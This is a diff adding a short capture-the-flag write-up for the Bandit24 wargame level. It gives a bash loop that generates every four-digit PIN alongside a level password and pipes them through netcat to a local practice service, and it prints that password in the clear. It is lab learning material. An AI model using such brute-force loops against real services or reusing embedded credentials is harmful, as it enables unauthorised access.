@@ -1,0 +1,26 @@
+Bandit24
+
+This one is pretty straightforward. We need to guess a four digit pin and send it to a server on port 30002. To generate all the possible 4 digit combinations and send
+them to the server we will need to write a shell script and pipe the output to netcat.
+
+.../bruteforce
+'''
+#! /bin/bash
+
+PASS="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+for T in {0..9};do
+  for H in {0..9};do
+    for t in {0..9};do
+      for O in {0..9};do
+        PIN="$T$H$t$O"
+        echo "$PASS $PIN"
+      done;
+    done;
+  done;
+done
+'''
+
+.../bruteforce | nc localhost 30002
+
+
